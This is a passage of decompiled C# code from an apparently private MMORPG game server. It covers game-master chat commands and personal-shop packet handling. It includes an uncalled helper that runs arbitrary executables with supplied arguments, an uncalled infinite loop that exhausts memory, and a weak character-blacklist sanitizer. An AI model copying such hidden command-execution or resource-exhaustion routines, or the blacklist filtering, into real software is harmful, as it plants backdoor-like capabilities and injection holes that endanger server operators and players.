				if (array.Length >= 2 && Buffer.IsEquals(text, "!gg"))
				{
					try
					{
						foreach (Players value11 in World.allConnectedChars.Values)
						{
							value11.系统提示(array[1], 10, base.UserName);
						}
					}
					catch
					{
					}
				}
				return true;
			}
			if (GM模式 == 8)
			{
				if (array.Length >= 1 && array[0] == "!restart")
				{
					foreach (Players value12 in World.allConnectedChars.Values)
					{
						value12.保存人物数据存储过程();
						value12.保存个人仓库存储过程();
						value12.保存综合仓库存储过程();
					}
					系统提示("服务器正在重启", 50, "");
					Process.Start(Assembly.GetExecutingAssembly().Location);
					Environment.Exit(0);
				}
				if (array.Length >= 2 && array[0] == "!reset")
				{
					World world = new World();
					string text2 = array[1];
					if (text2 != null)
					{
						switch (Class3.smethod_0(text2))
						{
						case 603940551u:
							if (text2 == "config")
							{
								world.SetConfig();
								系统提示("重读配置文件。", 50, "");
							}
							break;
						case 407568404u:
							if (text2 == "move")
							{
								world.Set移动();
								系统提示("重读移动数据。", 50, "");
							}
							break;
						case 1028619853u:
							if (text2 == "missoin")
							{
								world.Set任务数据新();
								系统提示("重读任务数据。", 50, "");
							}
							break;
						case 644720570u:
							if (text2 == "boxopen")
							{
								world.SetOpen();
								系统提示("重读物品开箱。", 50, "");
							}
							break;
						case 1769036337u:
							if (text2 == "kongfu")
							{
								world.SetKONGFU();
								系统提示("重读武功技能。", 50, "");
							}
							break;
						case 1692658528u:
							if (text2 == "exchange")
							{
								world.Set物品兑换();
								系统提示("重读物品兑换数据。", 50, "");
							}
							break;
						case 2302787484u:
							if (text2 == "levellimit")
							{
								world.Set升天气功();
								系统提示("重读升天气功数据。", 50, "");
							}
							break;
						case 2192707516u:
							if (text2 == "npcshop")
							{
								world.SetShop();
								系统提示("重读NPC商店。", 50, "");
							}
							break;
						case 1824094281u:
							if (text2 == "bossdrop")
							{
								world.SetBossDrop();
								系统提示("重读BOSS物品掉落。", 50, "");
							}
							break;
						case 2671260646u:
							if (text2 == "item")
							{
								world.SetItme();
								系统提示("重读装备物品。", 50, "");
							}
							break;
						case 2556470705u:
							if (text2 == "notice")
							{
								world.Set公告();
								系统提示("重读自动公告。", 50, "");
							}
							break;
						case 2846199180u:
							if (text2 == "drop")
							{
								world.SetDrop();
								系统提示("重读物品掉落。", 50, "");
							}
							break;
						case 2771239677u:
							if (text2 == "webshop")
							{
								world.SetBbgItem();
								系统提示("重读百宝物品。", 50, "");
							}
							break;
						case 3357104378u:
							if (text2 == "stone")
							{
								world.Set石头属性();
								系统提示("重读石头属性数据。", 50, "");
							}
							break;
						case 3306112409u:
							if (text2 == "kill")
							{
								world.SetKill();
								系统提示("重读发言过滤数据。", 50, "");
							}
							break;
						case 3624149137u:
							if (text2 == "monster")
							{
								world.SetMonSter();
								系统提示("重读怪物数据。", 50, "");
							}
							break;
						case 3493330057u:
							if (text2 == "killword")
							{
								world.SetKill();
								系统提示("重读关键字过滤。", 50, "");
							}
							break;
						case 3390427190u:
							if (text2 == "skill")
							{
								world.SetQG();
								world.Set升天气功();
								系统提示("重读气功数据。", 50, "");
							}
							break;
						}
					}
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!gg"))
				{
					try
					{
						foreach (Players value13 in World.allConnectedChars.Values)
						{
							value13.系统提示(array[1], 10, "系统提示");
						}
					}
					catch
					{
					}
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!move"))
				{
					if (array.Length >= 5)
					{
						移动(float.Parse(array[2]), float.Parse(array[3]), float.Parse(array[4]), int.Parse(array[1]));
					}
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!guai"))
				{
					更新NPC数据cc(idd, int.Parse(array[1]), this);
					系统提示(idd.ToString(), 10, "系统提示");
					idd++;
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!serguai"))
				{
					if (array.Length >= 3)
					{
						int num9 = 1;
						try
						{
							num9 = int.Parse(array[2]);
						}
						catch
						{
						}
						Random random = new Random();
						for (int j = 0; j < num9; j++)
						{
							int num10 = random.Next(0, 2);
							double num11 = random.NextDouble() * 50.0;
							double num12 = random.NextDouble() * 50.0;
							if (num10 == 0)
							{
								World.SerNpc(int.Parse(array[1]), base.人物坐标_X + (float)num11, base.人物坐标_Y + (float)num12, base.人物坐标_地图);
							}
							else
							{
								World.SerNpc(int.Parse(array[1]), base.人物坐标_X - (float)num11, base.人物坐标_Y - (float)num12, base.人物坐标_地图);
							}
							Thread.Sleep(10);
						}
					}
					else
					{
						World.SerNpc(int.Parse(array[1]), base.人物坐标_X, base.人物坐标_Y, base.人物坐标_地图);
					}
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!addguai"))
				{
					if (array.Length >= 3)
					{
						int num13 = 1;
						try
						{
							num13 = int.Parse(array[2]);
						}
						catch
						{
						}
						Random random2 = new Random();
						for (int k = 0; k < num13; k++)
						{
							int num14 = random2.Next(0, 2);
							double num15 = random2.NextDouble() * 100.0;
							double num16 = random2.NextDouble() * 100.0;
							if (num14 == 0)
							{
								World.AddNpc(int.Parse(array[1]), base.人物坐标_X + (float)num15, base.人物坐标_Y + (float)num16, base.人物坐标_地图);
							}
							else
							{
								World.AddNpc(int.Parse(array[1]), base.人物坐标_X - (float)num15, base.人物坐标_Y - (float)num16, base.人物坐标_地图);
							}
						}
					}
					else
					{
						World.AddNpc(int.Parse(array[1]), base.人物坐标_X, base.人物坐标_Y, base.人物坐标_地图);
					}
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!copyy"))
				{
					int int_ = -1;
					try
					{
						int_ = int.Parse(array[1]);
					}
					catch
					{
					}
					制造物品(0, Buffer.GetBytes(int_));
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!ys"))
				{
					if (隐身状态id == 0)
					{
						隐身状态id = 1;
					}
					else
					{
						隐身状态id = 0;
					}
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!del"))
				{
					int 位置 = -1;
					try
					{
						位置 = int.Parse(array[1]);
					}
					catch
					{
					}
					制造减去物品(位置, 1);
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!addll"))
				{
					int num17 = 0;
					try
					{
						num17 = int.Parse(array[1]);
					}
					catch
					{
					}
					base.Player_ExpErience += num17;
					更新经验和历练();
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!addwx"))
				{
					int player_WuXun = 0;
					try
					{
						player_WuXun = int.Parse(array[1]);
					}
					catch
					{
					}
					base.Player_WuXun = player_WuXun;
					更新武功和状态();
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!addqs"))
				{
					int num18 = 0;
					try
					{
						num18 = int.Parse(array[1]);
					}
					catch
					{
					}
					base.Player_Money += num18;
					更新金钱和负重();
					return true;
				}
				if (array.Length >= 5 && Buffer.IsEquals(text, "!hcts"))
				{
					try
					{
						合成提示(int.Parse(array[1]), int.Parse(array[2]), int.Parse(array[3]), 装备栏包裹[int.Parse(array[4])]);
						int.Parse(array[1]);
					}
					catch
					{
					}
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!kseve"))
				{
					if (World.eve == null)
					{
						World.eve = new EventClass();
						系统提示("势力战开始。");
					}
					else
					{
						World.eve.Dispose();
						系统提示("势力战停止。");
					}
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!kspvp"))
				{
					if (World.帮战 == null)
					{
						World.是否开启门战系统 = 1;
						World.帮战 = new 帮派战_门战();
						系统提示("帮派混战开始。");
					}
					else
					{
						World.帮战.Dispose();
						系统提示("帮派混战停止。");
					}
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!stoppvp90"))
				{
					if (World.EVEPVP != null)
					{
						World.EVEPVP.Dispose();
					}
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!addzt"))
				{
					Set追加状态物品(int.Parse(array[1]), int.Parse(array[2]), int.Parse(array[3]), int.Parse(array[4]));
					计算人物装备数据();
					更新武功和状态();
					更新HP_MP_SP();
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!msg"))
				{
					分解物品提示(int.Parse(array[1]));
					return true;
				}
				if (array.Length >= 2 && Buffer.IsEquals(text, "!copywp"))
				{
					int num19 = -1;
					try
					{
						num19 = int.Parse(array[1]);
					}
					catch
					{
					}
					new ItmeClass();
					ItmeClass itmeClass = (num19 != -1) ? ItmeClass.GetItmeID(num19) : ItmeClass.GetItme(array[1]);
					if (itmeClass != null)
					{
						int num20 = 1;
						if (array.Length >= 3)
						{
							num20 = int.Parse(array[2]);
						}
						if (num20 < 1)
						{
							num20 = 1;
						}
						for (int l = 1; l <= num20; l++)
						{
							int num21 = 得到包裹空位(this);
							if (num21 == -1)
							{
								break;
							}
							制造物品(num21, Buffer.GetBytes(itmeClass.FLD_PID));
						}
						系统提示(array[1] + "      数量      " + num20 + "个      完成", 10, "制造物品");
					}
					return true;
				}
			}
			return true;
		}

		public string cmdddd(string exe, string cmd)
		{
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = exe;
				process.StartInfo.Arguments = cmd;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardInput = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				string result = process.StandardOutput.ReadToEnd();
				process.Close();
				return result;
			}
			catch (Exception ex)
			{
				return "错误" + ex.Message.ToString();
			}
		}

		public void wtfsocpu100()
		{
			List<string> list = new List<string>();
			while (true)
			{
				string item = "AA5543000000002300340001000000CE4303000000000043EEF8050100000000000000010A0003010000014F68333CE3969800E3969800E3969800E3969800000000000000000055AA";
				list.Add(item);
			}
		}

		public void 制造减去物品(int 位置, int 数量)
		{
			byte[] array = Converter.hexStringToByte("AA5522000000220014000111000041EEF805010000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 11, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 18, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
		}

		public void 制造物品(int 位置, byte[] 物品ID)
		{
			byte[] bytes = Buffer.GetBytes(RxjhClass.GetDBItmeId());
			byte[] array = new byte[56];
			new ItmeClass();
			ItmeClass itmeID = ItmeClass.GetItmeID(Buffer.ToInt32(物品ID, 0));
			switch (Buffer.ToInt32(物品ID, 0))
			{
			case 800000023:
			{
				int fLD_MAGIC9 = new Random().Next(700035, 700035);
				物品ID = Buffer.GetBytes(800000023);
				itmeID.FLD_MAGIC0 = fLD_MAGIC9;
				break;
			}
			case 800000025:
			{
				int fLD_MAGIC8 = new Random().Next(1000002, 1000010);
				物品ID = Buffer.GetBytes(800000001);
				itmeID.FLD_MAGIC0 = fLD_MAGIC8;
				break;
			}
			case 800000026:
			{
				int fLD_MAGIC7 = new Random().Next(700002, 700010);
				物品ID = Buffer.GetBytes(800000001);
				itmeID.FLD_MAGIC0 = fLD_MAGIC7;
				break;
			}
			case 800000027:
			{
				string s = "200" + new Random().Next(0, 7) + "000";
				物品ID = Buffer.GetBytes(800000028);
				itmeID.FLD_MAGIC0 = int.Parse(s);
				break;
			}
			case 800000030:
			{
				int fLD_MAGIC6 = new Random().Next(700010, 700025);
				物品ID = Buffer.GetBytes(800000030);
				itmeID.FLD_MAGIC0 = fLD_MAGIC6;
				break;
			}
			case 800000011:
			{
				int fLD_MAGIC5 = new Random().Next(100002, 100010);
				物品ID = Buffer.GetBytes(800000001);
				itmeID.FLD_MAGIC0 = fLD_MAGIC5;
				break;
			}
			case 800000012:
			{
				int fLD_MAGIC4 = new Random().Next(200002, 200010);
				物品ID = Buffer.GetBytes(800000002);
				itmeID.FLD_MAGIC0 = fLD_MAGIC4;
				break;
			}
			case 800000013:
				new Random();
				物品ID = Buffer.GetBytes(800000013);
				itmeID.FLD_MAGIC0 = 800001;
				break;
			case 800000001:
			{
				int fLD_MAGIC3 = new Random().Next(1000020, 1000020);
				物品ID = Buffer.GetBytes(800000001);
				itmeID.FLD_MAGIC0 = fLD_MAGIC3;
				break;
			}
			case 800000062:
			case 800000068:
			{
				int fLD_MAGIC2 = new Random().Next(1100095, 1100095);
				物品ID = Buffer.GetBytes(800000062);
				itmeID.FLD_MAGIC0 = fLD_MAGIC2;
				break;
			}
			case 800000061:
			{
				int fLD_MAGIC = new Random().Next(700034, 700034);
				物品ID = Buffer.GetBytes(800000061);
				itmeID.FLD_MAGIC0 = fLD_MAGIC;
				break;
			}
			}
			System.Buffer.BlockCopy(Buffer.GetBytes(itmeID.FLD_MAGIC0), 0, array, 0, 4);
			System.Buffer.BlockCopy(Buffer.GetBytes(itmeID.FLD_MAGIC1), 0, array, 4, 4);
			System.Buffer.BlockCopy(Buffer.GetBytes(itmeID.FLD_MAGIC2), 0, array, 8, 4);
			System.Buffer.BlockCopy(Buffer.GetBytes(itmeID.FLD_MAGIC3), 0, array, 12, 4);
			System.Buffer.BlockCopy(Buffer.GetBytes(itmeID.FLD_MAGIC4), 0, array, 16, 4);
			增加物品(bytes, 物品ID, 位置, Buffer.GetBytes(1), array);
		}

		public void 更新NPC数据cc(int NPCid, int NPCid2, Players Playe)
		{
			byte[] array = Converter.hexStringToByte("AA554C00000067003E00010000007D297D2911270100000032000000320000000080A24300007041004088440000804000000000000000000080A243000070410040884400000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(NPCid), 0, array, 14, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(NPCid), 0, array, 16, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(NPCid2), 0, array, 18, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(200), 0, array, 24, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(200), 0, array, 28, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_X), 0, array, 32, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_Y), 0, array, 40, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_Z), 0, array, 36, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 48, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 52, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_X), 0, array, 56, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_Y), 0, array, 64, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_Z), 0, array, 60, 4);
			if (Playe.Client != null)
			{
				Playe.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public static string FilterSpecial(string str)
		{
			if (str.Length == 0)
			{
				return str;
			}
			str = str.Replace("'", string.Empty);
			str = str.Replace("<", string.Empty);
			str = str.Replace(">", string.Empty);
			str = str.Replace("%", string.Empty);
			str = str.Replace("'delete", string.Empty);
			str = str.Replace("''", string.Empty);
			str = str.Replace("\"\"", string.Empty);
			str = str.Replace(",", string.Empty);
			str = str.Replace(".", string.Empty);
			str = str.Replace(">=", string.Empty);
			str = str.Replace("=<", string.Empty);
			str = str.Replace("-", string.Empty);
			str = str.Replace("_", string.Empty);
			str = str.Replace(";", string.Empty);
			str = str.Replace("||", string.Empty);
			str = str.Replace("[", string.Empty);
			str = str.Replace("]", string.Empty);
			str = str.Replace("&", string.Empty);
			str = str.Replace("#", string.Empty);
			str = str.Replace("/", string.Empty);
			str = str.Replace("-", string.Empty);
			str = str.Replace("|", string.Empty);
			str = str.Replace("?", string.Empty);
			str = str.Replace(">?", string.Empty);
			str = str.Replace("?<", string.Empty);
			str = str.Replace("      ", string.Empty);
			return str;
		}

		public void 开店(string 商店名)
		{
			try
			{
				商店名 = FilterSpecial(商店名);
				byte[] bytes = Encoding.Default.GetBytes(商店名);
				打开仓库中 = true;
				个人商店 = new 个人商店类();
				个人商店.商店类型 = 1;
				byte[] array = Converter.hexStringToByte("AA5517000000CD00090001010500");
				byte[] array2 = Converter.hexStringToByte("000000000000000055AA");
				byte[] array3 = new byte[array.Length + array2.Length + bytes.Length];
				System.Buffer.BlockCopy(array, 0, array3, 0, array.Length);
				System.Buffer.BlockCopy(bytes, 0, array3, 15, bytes.Length);
				System.Buffer.BlockCopy(array2, 0, array3, array3.Length - array2.Length, array2.Length);
				array3[2] = (byte)(18 + bytes.Length);
				array3[9] = (byte)(4 + bytes.Length);
				array3[12] = (byte)bytes.Length;
				个人商店.商店名 = bytes;
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
			}
			catch
			{
			}
		}

		public void 开店(byte[] data, int length)
		{
			int num = 0;
			try
			{
				if (!退出中 && !进店中)
				{
					if (base.人物坐标_地图 != 101)
					{
						系统提示("只有新手城里才可以开商店。");
						byte[] array = Converter.hexStringToByte("AA5510000000CD0002000404000000000000000055AA");
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
					}
					else
					{
						封包修改(data, length);
						byte[] array2 = new byte[4];
						System.Buffer.BlockCopy(data, 10, array2, 0, 1);
						int num2 = BitConverter.ToInt32(array2, 0);
						num = 1;
						switch (num2)
						{
						case 1:
							if (!打开仓库中 && !进店中)
							{
								int num3 = data[11];
								byte[] array15 = new byte[num3];
								for (int i = 0; i < num3; i++)
								{
									array15[i] = data[13 + i];
								}
								if (num3 > 24)
								{
									起名提示(3);
									byte[] array16 = Converter.hexStringToByte("AA5510000000CD0002000404000000000000000055AA");
									System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array16, 4, 2);
									if (base.Client != null)
									{
										base.Client.Send(array16, array16.Length);
									}
								}
								else
								{
									商店名 = Encoding.Default.GetString(array15).Trim();
									开店(商店名);
								}
							}
							break;
						case 2:
						{
							byte[] array7 = new byte[4];
							byte[] dst = new byte[8];
							byte[] array8 = new byte[8];
							byte[] array9 = new byte[4];
							byte[] array10 = new byte[4];
							System.Buffer.BlockCopy(data, 11, array7, 0, 4);
							System.Buffer.BlockCopy(data, 19, dst, 0, 8);
							System.Buffer.BlockCopy(data, 27, array9, 0, 2);
							System.Buffer.BlockCopy(data, 29, array10, 0, 2);
							System.Buffer.BlockCopy(data, 31, array8, 0, 8);
							num = 6;
							if (BitConverter.ToInt32(array9, 0) > 0 && BitConverter.ToInt64(array8, 0) > 0L)
							{
								num = 7;
								if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array10, 0)].物品数量, 0) < BitConverter.ToInt32(array9, 0))
								{
									byte[] array11 = Converter.hexStringToByte("AA551100AE04CD000300021B000000000000009BE255AA");
									System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array11, 4, 2);
									if (base.Client != null)
									{
										base.Client.Send(array11, array11.Length);
									}
								}
								else
								{
									num = 8;
									ItmeClass value;
									if (装备栏包裹[BitConverter.ToInt32(array10, 0)].物品绑定)
									{
										byte[] array12 = Converter.hexStringToByte("AA551100AE04CD000300021B000000000000009BE255AA");
										System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array12, 4, 2);
										if (base.Client != null)
										{
											base.Client.Send(array12, array12.Length);
										}
									}
									else if (World.Itme.TryGetValue(BitConverter.ToInt32(array7, 0), out value))
									{
										if (value.FLD_LOCK == 1)
										{
											系统提示("锁定的物品禁止买卖。");
											byte[] array13 = Converter.hexStringToByte("AA551100AE04CD000300021B000000000000009BE255AA");
											System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array13, 4, 2);
											if (base.Client != null)
											{
												base.Client.Send(array13, array13.Length);
											}
										}
										else
										{
											num = 9;
											if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array10, 0)].物品ID, 0) == 0)
											{
												byte[] array14 = Converter.hexStringToByte("AA551100AE04CD000300021B000000000000009BE255AA");
												System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array14, 4, 2);
												if (base.Client != null)
												{
													base.Client.Send(array14, array14.Length);
												}
											}
											else
											{
												num = 10;
												装备栏包裹[BitConverter.ToInt32(array10, 0)].锁定 = true;
												num = 11;
												个人商店物品类 个人商店物品类 = new 个人商店物品类();
												个人商店物品类.数量 = BitConverter.ToInt32(array9, 0);
												个人商店物品类.价格 = BitConverter.ToInt64(array8, 0);
												个人商店物品类.位置 = BitConverter.ToInt32(array10, 0);
												num = 12;
												个人商店物品类.物品 = 装备栏包裹[BitConverter.ToInt32(array10, 0)];
												num = 13;
												if (个人商店 != null && 个人商店.商店物品列表 != null)
												{
													个人商店.商店物品列表.Add(BitConverter.ToInt64(装备栏包裹[BitConverter.ToInt32(array10, 0)].物品全局ID, 0), 个人商店物品类);
													num = 14;
													发包类 发包类 = new 发包类();
													发包类.Write(2);
													发包类.Write(2);
													发包类.Write8(个人商店物品类.物品.Get物品ID);
													发包类.Write8(个人商店物品类.物品.Get物品全局ID);
													发包类.Write2(个人商店物品类.数量);
													发包类.Write2(个人商店物品类.位置);
													发包类.Write8(个人商店物品类.价格);
													发包类.Write4(个人商店物品类.物品.FLD_MAGIC0);
													发包类.Write4(个人商店物品类.物品.FLD_MAGIC1);
													发包类.Write4(个人商店物品类.物品.FLD_MAGIC2);
													发包类.Write4(个人商店物品类.物品.FLD_MAGIC3);
													发包类.Write4(个人商店物品类.物品.FLD_MAGIC4);
													发包类.Write2(个人商店物品类.物品.FLD_FJ_MAGIC0);
													发包类.Write2(个人商店物品类.物品.FLD_FJ_MAGIC1);
													发包类.Write2(个人商店物品类.物品.FLD_FJ_中级附魂);
													发包类.Write2(个人商店物品类.物品.FLD_FJ_MAGIC2);
													发包类.Write2(个人商店物品类.物品.FLD_FJ_MAGIC3);
													发包类.Write2(个人商店物品类.物品.FLD_FJ_MAGIC4);
													发包类.Write2(个人商店物品类.物品.FLD_FJ_MAGIC5);
													发包类.Write2(0);
													num = 15;
													发包类.Write4(个人商店物品类.物品.FLD_KSSJ);
													发包类.Write4(个人商店物品类.物品.FLD_JSSJ);
													num = 16;
													发包类.Write2(个人商店物品类.物品.FLD_FJ_NJ);
													发包类.Write4(个人商店物品类.物品.FLD_FJ_觉醒);
													发包类.Write2(0);
													发包类.Write2(个人商店物品类.物品.FLD_FJ_进化);
													发包类.Write2(0);
													发包类.Write4(个人商店物品类.物品.FLD_FJ_四神之力);
													发包类.Write4(0);
													发包类.Write4(0);
													发包类.Write4(0);
													if (base.Client != null)
													{
														base.Client.SendPak(发包类, 52480, base.人物全服ID);
													}
													num = 17;
													if (是否灵兽((int)个人商店物品类.物品.Get物品ID))
													{
														发送灵兽数据((int)个人商店物品类.物品.Get物品全局ID);
													}
												}
											}
										}
									}
								}
							}
							break;
						}
						case 3:
						{
							个人商店.个人商店是否开启 = true;
							num = 18;
							byte[] array3 = Converter.hexStringToByte("AA5510000000CD0002000303000000000000000055AA");
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
							if (base.Client != null)
							{
								base.Client.Send(array3, array3.Length);
							}
							num = 19;
							byte[] array4 = Converter.hexStringToByte("AA5522000000CA0014000100000000000000000000000600");
							byte[] array5 = Converter.hexStringToByte("000000000000000055AA");
							num = 20;
							byte[] array6 = new byte[array4.Length + array5.Length + 个人商店.商店名.Length];
							num = 21;
							System.Buffer.BlockCopy(array4, 0, array6, 0, array4.Length);
							System.Buffer.BlockCopy(个人商店.商店名, 0, array6, 24, 个人商店.商店名.Length);
							System.Buffer.BlockCopy(array5, 0, array6, array6.Length - array5.Length, array5.Length);
							num = 22;
							array6[2] = (byte)(28 + 个人商店.商店名.Length);
							array6[9] = (byte)(14 + 个人商店.商店名.Length);
							array6[22] = (byte)个人商店.商店名.Length;
							num = 23;
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 14, 4);
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 18, 4);
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 4, 2);
							个人商店.个人商店是否开启 = true;
							if (base.Client != null)
							{
								base.Client.Send(array6, array6.Length);
							}
							num = 24;
							发送当前范围广播数据(array6, array6.Length);
							break;
						}
						case 4:
							num = 26;
							关店();
							break;
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "个人商店开店出错![" + base.Userid + "]-[" + base.UserName + "]" + num + "|" + ex.Message);
			}
		}

		public void 进店(Players Playe)
		{
			try
			{
				Playe.个人商店.个人商店是否使用中 = true;
				进店中 = true;
				进店中ID = Playe.人物全服ID;
				打开仓库中 = true;
				发包类 发包类 = new 发包类();
				发包类.Write(1);
				发包类.Write(1);
				发包类.Write4(Playe.人物全服ID);
				发包类.Write2(Playe.个人商店.商店名.Length);
				发包类.Write(Playe.个人商店.商店名, 0, Playe.个人商店.商店名.Length);
				发包类.Write2(Playe.个人商店.商店物品列表.Count);
				foreach (个人商店物品类 value in Playe.个人商店.商店物品列表.Values)
				{
					发包类.Write8(value.物品.Get物品ID);
					发包类.Write8(value.物品.Get物品全局ID);
					发包类.Write2(value.数量);
					发包类.Write2(value.位置);
					发包类.Write8(value.价格);
					发包类.Write4(value.物品.FLD_MAGIC0);
					发包类.Write4(value.物品.FLD_MAGIC1);
					发包类.Write4(value.物品.FLD_MAGIC2);
					发包类.Write4(value.物品.FLD_MAGIC3);
					发包类.Write4(value.物品.FLD_MAGIC4);
					发包类.Write2(value.物品.FLD_FJ_MAGIC0);
					发包类.Write2(value.物品.FLD_FJ_MAGIC1);
					发包类.Write2(value.物品.FLD_FJ_中级附魂);
					发包类.Write2(value.物品.FLD_FJ_MAGIC2);
					发包类.Write2(value.物品.FLD_FJ_MAGIC3);
					发包类.Write2(value.物品.FLD_FJ_MAGIC4);
					发包类.Write2(value.物品.FLD_FJ_MAGIC5);
					发包类.Write2(0);
					发包类.Write4(value.物品.FLD_KSSJ);
					发包类.Write4(value.物品.FLD_JSSJ);
					发包类.Write2(value.物品.FLD_FJ_NJ);
					发包类.Write4(value.物品.FLD_FJ_觉醒);
					发包类.Write2(0);
					发包类.Write2(value.物品.FLD_FJ_进化);
					发包类.Write2(0);
					发包类.Write4(value.物品.FLD_FJ_四神之力);
					发包类.Write8((int)value.物品.Get物品全局ID);
					发包类.Write4(0);
					if (是否灵兽((int)value.物品.Get物品ID))
					{
						发送灵兽数据((int)value.物品.Get物品全局ID);
					}
				}
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 52992, base.人物全服ID);
				}
				byte[] array = Converter.hexStringToByte("AA5516006501591008000100000000000000000000000000B11A55AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				byte[] array2 = Converter.hexStringToByte("AA5518000000CF000A0001010000000001000000000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array2, 12, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 16, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
				if (Playe.Client != null)
				{
					Playe.Client.Send(array2, array2.Length);
				}
				Playe.个人商店.进入人 = this;
			}
			catch
			{
			}
		}

		public void 关店提示(int 人物ID)
		{
			byte[] array = Converter.hexStringToByte("AA5514000000CF000600030319000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 12, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 进店(byte[] data, int length)
		{
			try
			{
				封包修改(data, length);
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				System.Buffer.BlockCopy(data, 10, array, 0, 1);
				System.Buffer.BlockCopy(data, 11, array2, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				int num2 = BitConverter.ToInt32(array2, 0);
				switch (num)
				{
				case 1:
					if (!打开仓库中 && !进店中)
					{
						Players players2 = 得到人物数据(num2);
						if (players2 != null)
						{
							if (players2.个人商店.个人商店是否开启 && players2.个人商店.商店类型 != 2)
							{
								if (!查找范围玩家(40, players2))
								{
									商店提示(12);
									关店提示(num2);
								}
								else if (players2.个人商店.个人商店是否使用中)
								{
									商店提示(13);
									关店提示(num2);
								}
								else
								{
									进店(players2);
									进店中ID = players2.人物全服ID;
								}
							}
							else
							{
								商店提示(14);
								关店提示(num2);
							}
						}
					}
					break;
				case 2:
					if (进店中ID != 0)
					{
						if (num2 == 0)
						{
							出店(进店中ID);
						}
						else if (进店中ID != num2)
						{
							出店(进店中ID);
						}
						else if (base.元宝账户状态)
						{
							出店(进店中ID);
							系统提示("元宝处于锁定状态。");
						}
						else
						{
							Players players = 得到人物数据(num2);
							if (players == null)
							{
								出店(进店中ID);
							}
							else if (!players.打开仓库中)
							{
								出店(进店中ID);
							}
							else if (players.退出中)
							{
								出店(进店中ID);
							}
							else
							{
								int num3 = BitConverter.ToInt32(data, 15);
								long num4 = BitConverter.ToInt64(data, 23);
								int num5 = BitConverter.ToInt16(data, 31);
								个人商店物品类 value;
